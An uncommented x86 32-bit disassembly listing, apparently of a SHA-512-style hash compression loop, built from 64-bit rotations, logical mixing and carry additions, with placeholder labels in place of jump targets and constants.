mov edi [ esp + 0x74 ]
or ebp eax
mov eax [ esp + 0x6c ]
or ebx edx
mov edx [ esp + 0x70 ]
mov ecx 0x7
xor esi ebp
xor edi ebx
call sub_1001d150
mov ecx [ esp + 0x60 ]
xor esi eax
mov eax [ esp + 0xac ]
xor edi edx
mov edx [ esp + 0x64 ]
mov ebp [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ esp + 0x10 ]
add edx esi
adc ecx edi
add edx ebp
mov edi [ eax ]
mov ebp [ esp + 0x34 ]
adc ecx ebx
mov ebx [ esp + 0x30 ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x88 ] eax
mov [ esp + 0x74 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x88 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x74 ]
or eax edx
mov edx [ esp + 0x34 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x34 ]
or ebp eax
mov eax [ esp + 0x30 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x48 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x4c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x40 ]
and ebp eax
mov eax [ esp + 0x44 ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
adc edi ebx
mov ebp [ eax + 0x30 ]
mov ebx [ eax + 0x34 ]
mov eax [ esp + 0x10 ]
add esi ebp
mov ebp [ esp + 0x5c ]
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x58 ]
adc edi ebx
mov ebx [ esp + 0x28 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x2c ]
adc esi edi
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x54 ]
mov [ esp + 0x2c ] esi
mov esi [ esp + 0x50 ]
mov [ esp + 0x28 ] ebx
mov ebx esi
mov ecx 0x1c
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x74 ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x88 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x88 ]
mov esi [ esp + 0x74 ]
or ecx eax
mov eax [ esp + 0x50 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x50 ]
or edi eax
mov eax [ esp + 0x20 ]
xor ebp edi
or ebx edx
mov edx [ esp + 0x24 ]
mov edi eax
and eax [ esp + 0x50 ]
xor esi ebx
xor edi ecx
mov ecx [ esp + 0x54 ]
and edi [ esp + 0x38 ]
mov ebx edx
and edx ecx
xor ebx ecx
xor edi eax
and ebx [ esp + 0x3c ]
mov eax [ esp + 0x18 ]
xor ebx edx
add ebp edi
adc esi ebx
mov ebx [ esp + 0x1c ]
add ebp eax
adc esi ebx
mov edx ebp
mov eax [ esp + 0x8c ]
mov ebp [ esp + 0x90 ]
add eax 0x8
add ebp 0x40
mov [ esp + 0x58 ] edx
mov [ esp + 0x5c ] esi
lea edi [ eax - 0x1 ]
mov [ esp + 0x8c ] eax
cmp edi 0x50
mov [ esp + 0x90 ] ebp
jl r-xdata
mov eax [ esp + 0x138 ]
mov ebp [ eax ]
mov edi [ eax + 0x8 ]
add ebp edx
mov edx [ esp + 0x50 ]
mov [ eax ] ebp
mov ebx [ eax + 0x4 ]
adc ebx esi
add edi edx
mov edx [ eax + 0x10 ]
mov [ eax + 0x8 ] edi
mov esi [ eax + 0xc ]
mov ebp [ eax + 0x18 ]
adc esi ecx
mov ecx [ esp + 0x20 ]
add edx ecx
mov edi [ eax + 0x20 ]
mov [ eax + 0x10 ] edx
mov edx [ esp + 0x24 ]
mov ecx [ eax + 0x14 ]
mov [ eax + 0x4 ] ebx
adc ecx edx
mov edx [ esp + 0x3c ]
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x38 ]
add ebp ecx
mov ecx [ esp + 0x28 ]
mov [ eax + 0x18 ] ebp
mov ebx [ eax + 0x1c ]
adc ebx edx
mov edx [ esp + 0x2c ]
add edi ecx
mov ecx [ esp + 0x30 ]
mov [ eax + 0xc ] esi
mov [ eax + 0x20 ] edi
mov esi [ eax + 0x24 ]
mov ebp [ eax + 0x30 ]
adc esi edx
mov edx [ eax + 0x28 ]
add edx ecx
mov edi [ eax + 0x38 ]
mov [ eax + 0x28 ] edx
mov edx [ esp + 0x34 ]
mov ecx [ eax + 0x2c ]
mov [ eax + 0x1c ] ebx
adc ecx edx
mov edx [ esp + 0x44 ]
mov [ eax + 0x2c ] ecx
mov ecx [ esp + 0x40 ]
add ebp ecx
mov ecx [ esp + 0x48 ]
mov [ eax + 0x30 ] ebp
mov ebx [ eax + 0x34 ]
adc ebx edx
mov edx [ esp + 0x4c ]
add edi ecx
mov ecx [ esp + 0xb0 ]
mov [ eax + 0x24 ] esi
mov [ eax + 0x38 ] edi
mov esi [ eax + 0x3c ]
mov [ eax + 0x34 ] ebx
adc esi edx
mov edx [ esp + 0x78 ]
add edx 0x80
dec ecx
mov [ eax + 0x3c ] esi
mov [ esp + 0x78 ] edx
mov [ esp + 0xb0 ] ecx
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x58 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x5c ] edx
mov edx [ eax + 0xc ]
mov [ esp + 0x50 ] ecx
mov ecx [ eax + 0x10 ]
mov [ esp + 0x54 ] edx
mov edx [ eax + 0x14 ]
mov [ esp + 0x20 ] ecx
mov ecx [ eax + 0x18 ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0x1c ]
mov ebx [ eax + 0x20 ]
mov ebp [ eax + 0x24 ]
mov [ esp + 0x38 ] ecx
mov ecx [ eax + 0x28 ]
mov [ esp + 0x3c ] edx
mov edx [ eax + 0x2c ]
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x30 ]
mov [ esp + 0x34 ] edx
mov edx [ eax + 0x34 ]
mov [ esp + 0x40 ] ecx
mov ecx [ eax + 0x38 ]
mov [ esp + 0x44 ] edx
mov edx [ eax + 0x3c ]
mov eax [ esp + 0x78 ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebp
lea ecx [ eax - 0x10 ]
mov [ esp + 0x4c ] edx
call sub_100400d0
mov [ esp + 0xb4 ] eax
mov [ esp + 0xb8 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x2c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x2c ]
or ebp eax
mov eax [ esp + 0x28 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x40 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x44 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x30 ]
and ebp eax
mov eax [ esp + 0x34 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
xor ebx eax
mov eax [ r--data ]
mov ecx [ esp + 0x48 ]
add esi edx
mov edx [ esp + 0xb8 ]
adc edi ebx
mov ebx [ esp + 0xb4 ]
add esi eax
mov eax [ esp + 0x4c ]
adc edi ebp
mov ebp [ esp + 0x38 ]
add esi ebx
mov ebx [ esp + 0x3c ]
adc edi edx
add esi ecx
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x54 ]
adc edi eax
add ebp esi
adc ebx edi
mov eax ecx
mov [ esp + 0x3c ] ebx
mov ebx [ esp + 0x58 ]
xor eax ebx
mov [ esp + 0x38 ] ebp
mov ebp [ esp + 0x5c ]
mov [ esp + 0x9c ] eax
mov eax edx
mov [ esp + 0x18 ] esi
xor eax ebp
mov esi ebx
mov [ esp + 0xa0 ] eax
mov eax ecx
and eax ebx
mov [ esp + 0x1c ] edi
mov [ esp + 0x94 ] eax
mov eax edx
and eax ebp
mov ecx 0x1c
mov [ esp + 0x98 ] eax
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x58 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x9c ]
or ebx eax
or ebp edx
mov edx [ esp + 0x20 ]
xor edi ebx
xor esi ebp
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x94 ]
mov ebx [ esp + 0x98 ]
and ecx edx
mov edx [ esp + 0xa0 ]
xor ecx ebp
and edx eax
mov eax [ esp + 0x78 ]
xor edx ebx
mov ebx [ esp + 0x18 ]
add edi ecx
lea ecx [ eax - 0x8 ]
adc esi edx
add edi ebx
mov [ esp + 0x48 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x4c ] esi
call sub_100400d0
mov ebp [ esp + 0x3c ]
mov ebx [ esp + 0x38 ]
mov [ esp + 0xbc ] eax
mov [ esp + 0xc0 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x3c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x3c ]
or ebp eax
mov eax [ esp + 0x38 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x30 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x34 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x28 ]
and ebp eax
mov eax [ esp + 0x2c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
xor ebx eax
add esi edx
mov edx [ esp + 0xbc ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
adc edi ebx
add esi edx
mov ecx [ esp + 0xc0 ]
mov eax [ esp + 0x40 ]
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x20 ]
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x4c ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x24 ]
mov [ esp + 0x20 ] ebx
mov ebx [ esp + 0x48 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x24 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x48 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0xa0 ]
or ebx eax
mov eax [ esp + 0x9c ]
or ebp edx
mov edx [ esp + 0x4c ]
xor edi ebx
mov ebx [ esp + 0x48 ]
xor esi ebp
mov ebp [ esp + 0x94 ]
and eax ebx
mov ebx [ esp + 0x98 ]
and ecx edx
xor eax ebp
xor ecx ebx
mov ebx [ esp + 0x18 ]
add edi eax
adc esi ecx
mov ecx [ esp + 0x78 ]
add edi ebx
mov [ esp + 0x40 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x44 ] esi
call sub_100400d0
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
mov esi ebp
mov [ esp + 0xc4 ] eax
mov [ esp + 0xc8 ] edx
mov ecx 0x17
shr esi 0x9
xor edi edi
mov eax ebx
mov edx ebp
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x24 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x24 ]
or ebp eax
mov eax [ esp + 0x20 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x28 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x2c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x38 ]
and ebp eax
mov eax [ esp + 0x3c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0xc8 ]
xor ebx eax
mov eax [ esp + 0x30 ]
add esi edx
mov edx [ esp + 0xc4 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x34 ]
adc edi ebx
mov ebx [ esp + 0x50 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x44 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x54 ]
mov [ esp + 0x50 ] ebx
mov ebx [ esp + 0x40 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x54 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
mov ecx 0x1e
shr edx 0x2
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x40 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x5c ]
or ebx eax
mov eax [ esp + 0x58 ]
or ebp edx
mov edx [ esp + 0x40 ]
xor edi ebx
xor esi ebp
mov ebp [ esp + 0x44 ]
mov ebx edx
xor ebp ecx
and ebp [ esp + 0x4c ]
xor ebx eax
and ebx [ esp + 0x48 ]
and edx eax
mov eax [ esp + 0x44 ]
and eax ecx
xor ebx edx
xor ebp eax
mov ecx [ esp + 0x78 ]
add edi ebx
mov ebx [ esp + 0x18 ]
adc esi ebp
add edi ebx
mov [ esp + 0x30 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
add ecx 0x8
mov [ esp + 0x34 ] esi
call sub_100400d0
mov ebp [ esp + 0x54 ]
mov ebx [ esp + 0x50 ]
mov [ esp + 0xcc ] eax
mov [ esp + 0xd0 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x54 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x54 ]
or ebp eax
mov eax [ esp + 0x50 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x38 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x3c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x20 ]
and ebp eax
mov eax [ esp + 0x24 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0xd0 ]
xor ebx eax
mov eax [ esp + 0x28 ]
add esi edx
mov edx [ esp + 0xcc ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x2c ]
adc edi ebx
mov ebx [ esp + 0x58 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x34 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x5c ]
mov [ esp + 0x58 ] ebx
mov ebx [ esp + 0x30 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x5c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x30 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
or ebx eax
mov eax [ esp + 0x40 ]
or ebp edx
xor edi ebx
xor esi ebp
mov edx eax
mov ecx [ esp + 0x30 ]
mov ebp [ esp + 0x34 ]
xor edx ecx
mov ecx [ esp + 0x44 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x48 ]
and edx ebp
mov ebp [ esp + 0x4c ]
and ebx ebp
mov ebp [ esp + 0x30 ]
and eax ebp
mov ebp [ esp + 0x34 ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x10 ]
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x2c ] esi
call sub_100400d0
mov ebp [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
mov [ esp + 0xd4 ] eax
mov [ esp + 0xd8 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x5c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x5c ]
or ebp eax
mov eax [ esp + 0x58 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x20 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x24 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x50 ]
and ebp eax
mov eax [ esp + 0x54 ]
and eax ecx
xor edx ebp
xor ebx eax
mov ebp [ r--data ]
mov ecx [ esp + 0xd8 ]
mov eax [ esp + 0x38 ]
add esi edx
mov edx [ esp + 0xd4 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x3c ]
adc edi ebx
mov ebx [ esp + 0x48 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x2c ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x4c ]
mov [ esp + 0x48 ] ebx
mov ebx [ esp + 0x28 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x4c ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x28 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x28 ]
or ebx eax
mov eax [ esp + 0x30 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x34 ]
xor esi ebp
mov ebp [ esp + 0x2c ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x40 ]
and edx ebp
mov ebp [ esp + 0x44 ]
and ebx ebp
mov ebp [ esp + 0x28 ]
and eax ebp
mov ebp [ esp + 0x2c ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
mov eax [ esp + 0x78 ]
mov [ esp + 0x38 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
lea ecx [ eax + 0x18 ]
mov [ esp + 0x3c ] esi
call sub_100400d0
mov ebp [ esp + 0x4c ]
mov ebx [ esp + 0x48 ]
mov [ esp + 0xdc ] eax
mov [ esp + 0xe0 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x4c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x4c ]
or ebp eax
mov eax [ esp + 0x48 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x50 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x54 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x58 ]
and eax ebp
mov ebp [ esp + 0x5c ]
and ecx ebp
mov ebp [ r--data ]
xor edx eax
xor ebx ecx
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x20 ]
add esi edx
mov edx [ esp + 0xdc ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x24 ]
adc edi ebx
mov ebx [ esp + 0x40 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
add ebx esi
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x44 ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x40 ] ebx
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
adc esi edi
mov ecx 0x1c
mov [ esp + 0x44 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
xor eax eax
shr edx 0x2
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx 0x1e
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x38 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x38 ]
or ebx eax
mov eax [ esp + 0x28 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x2c ]
xor esi ebp
mov ebp [ esp + 0x3c ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x30 ]
and edx ebp
mov ebp [ esp + 0x34 ]
and ebx ebp
mov ebp [ esp + 0x38 ]
and eax ebp
mov ebp [ esp + 0x3c ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x20 ]
mov [ esp + 0x20 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x24 ] esi
call sub_100400d0
mov ebp [ esp + 0x44 ]
mov ebx [ esp + 0x40 ]
mov [ esp + 0xe4 ] eax
mov [ esp + 0xe8 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or esi eax
or edi edx
mov edx ebx
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x44 ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x44 ]
or ebp eax
mov eax [ esp + 0x40 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x58 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x5c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x48 ]
and ebp eax
mov eax [ esp + 0x4c ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0xe8 ]
xor ebx eax
mov eax [ esp + 0x50 ]
add esi edx
mov edx [ esp + 0xe4 ]
adc edi ebx
mov ebx [ r--data ]
add esi ebp
mov ebp [ esp + 0x54 ]
adc edi ebx
mov ebx [ esp + 0x30 ]
add esi edx
adc edi ecx
add esi eax
adc edi ebp
mov ebp [ esp + 0x24 ]
mov [ esp + 0x18 ] esi
add ebx esi
mov esi [ esp + 0x34 ]
mov [ esp + 0x30 ] ebx
mov ebx [ esp + 0x20 ]
mov [ esp + 0x1c ] edi
adc esi edi
mov ecx 0x1c
mov [ esp + 0x34 ] esi
mov esi ebx
mov eax ebx
mov edx ebp
xor edi edi
shl esi 0x4
call sub_1001d150
or esi edx
mov edx ebp
or edi eax
mov ecx 0x1e
shr edx 0x2
xor eax eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov eax ebx
mov edx ebp
call sub_1006b020
mov ecx [ esp + 0x10 ]
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx ebp
xor edi ecx
xor esi eax
mov eax [ esp + 0x20 ]
mov ebx edx
mov ecx 0x19
xor ebp ebp
shr ebx 0x7
call sub_1006b020
mov ecx [ esp + 0x20 ]
or ebx eax
mov eax [ esp + 0x38 ]
or ebp edx
mov edx eax
xor edi ebx
xor edx ecx
mov ecx [ esp + 0x3c ]
xor esi ebp
mov ebp [ esp + 0x24 ]
mov ebx ecx
xor ebx ebp
mov ebp [ esp + 0x28 ]
and edx ebp
mov ebp [ esp + 0x2c ]
and ebx ebp
mov ebp [ esp + 0x20 ]
and eax ebp
mov ebp [ esp + 0x24 ]
and ecx ebp
xor edx eax
xor ebx ecx
add edi edx
mov eax [ esp + 0x78 ]
adc esi ebx
mov ebx [ esp + 0x18 ]
add edi ebx
lea ecx [ eax + 0x28 ]
mov [ esp + 0x50 ] edi
mov edi [ esp + 0x1c ]
adc esi edi
mov [ esp + 0x54 ] esi
call sub_100400d0
mov ebp [ esp + 0x34 ]
mov ebx [ esp + 0x30 ]
mov [ esp + 0xec ] eax
mov [ esp + 0xf0 ] edx
mov esi ebp
mov ecx 0x17
mov eax ebx
mov edx ebp
shr esi 0x9
xor edi edi
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x10 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x14 ]
or eax edx
mov edx [ esp + 0x34 ]
xor edi eax
xor esi ecx
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x34 ]
or ebp eax
mov eax [ esp + 0x30 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x48 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x4c ]
not ebx
and ebx ebp
mov ebp [ esp + 0x40 ]
and ebp eax
mov eax [ esp + 0x44 ]
and eax ecx
xor edx ebp
mov ebp [ r--data ]
mov ecx [ esp + 0xf0 ]
xor ebx eax
